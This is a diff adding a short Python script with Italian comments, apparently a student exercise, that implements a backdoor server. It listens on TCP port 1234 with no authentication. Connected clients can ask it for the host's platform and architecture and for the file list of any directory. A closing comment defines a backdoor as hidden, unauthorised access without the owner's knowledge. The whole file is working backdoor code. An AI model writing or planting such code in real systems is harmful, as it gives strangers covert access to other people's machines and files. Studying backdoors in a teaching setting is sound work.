@@ -1,0 +1,50 @@
+# Importa i moduli necessari
+import socket, platform, os
+
+# Indirizzo IP e porta del server
+SRV_ADDR = ""
+SRV_PORT = 1234
+
+# Crea un socket TCP
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+# Associa il socket all'indirizzo e alla porta specificati
+s.bind((SRV_ADDR, SRV_PORT))
+
+# Mette il socket in modalità di ascolto per accettare connessioni
+s.listen(1)
+
+# Accetta una connessione in arrivo e ottiene il socket e l'indirizzo del client
+connection, address = s.accept()
+
+# Stampa un messaggio quando il client si connette
+print("Client connected: ", address)
+
+
+while 1:
+    try:
+        # Riceve i dati inviati dal client
+        data = connection.recv(1024)
+    except:
+        continue  # Salta alla prossima iterazione del loop in caso di errore durante la ricezione
+
+   
+    if data.decode('utf-8') == '1':
+        # Se il comando è '1', invia al client le informazioni sulla piattaforma e l'architettura del sistema
+        tosend = platform.platform() + " " + platform.machine()
+        connection.sendall(tosend.encode())
+    elif data.decode('utf-8') == '2':
+        # Se il comando è '2', attende di ricevere un percorso dal client e restituisce la lista dei file nella directory specificata
+        data = connection.recv(1024)
+        try:
+            filelist = os.listdir(data.decode('utf-8'))
+            tosend = ",".join(filelist)  # Unisce i nomi dei file in una stringa separata da virgole
+        except:
+            tosend = "Wrong path"  # invia un messaggio di errore
+        connection.sendall(tosend.encode())
+    elif data.decode('utf-8') == '0':
+        # Se il comando è '0', chiude la connessione attuale e si prepara ad accettare una nuova connessione
+        connection.close()
+        connection, address = s.accept()
+# La backdoor e come una porta segreta nascosta nel software di un computer o un software.Essa permette a chi la conosce l'accesso non autorizzato o il controllo del sistema  senza
+# che il proprietario del sistema ne sia a conoscenza. Infatti costituisce una minaccia per la sicurezza informatica in quanto puo essere usata per scopi malevoli.
